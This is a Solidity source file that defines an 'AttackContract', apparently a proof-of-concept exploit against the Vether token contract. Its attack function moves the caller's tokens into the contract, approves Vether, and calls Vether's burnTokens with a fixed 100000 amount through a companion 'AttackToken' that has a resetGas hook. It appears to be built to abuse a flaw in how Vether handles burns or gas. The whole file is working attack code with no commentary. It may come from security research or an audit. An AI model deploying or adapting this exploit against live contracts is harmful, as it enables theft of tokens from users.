pragma solidity 0.6.4;

// import './AttackToken.sol';
// import './Vether.sol';

interface Vether {
    function burnTokens(address token, uint amount) external;
}

interface AttackToken {
    function transferFrom(address, address, uint) external returns (bool);
    function approve(address, uint) external returns (bool);
    function resetGas() external;
}

contract AttackContract {

    address public attackToken;
    address public vether;

    constructor(address tokenAttack, address addressVether) public{
        attackToken = tokenAttack;
        vether = addressVether;
    }

    function attack(uint _amount) public {
        AttackToken(attackToken).transferFrom(msg.sender, address(this), _amount);
        AttackToken(attackToken).approve(vether, _amount);
        Vether(vether).burnTokens(attackToken, 100000);
        AttackToken(attackToken).resetGas();
    }


}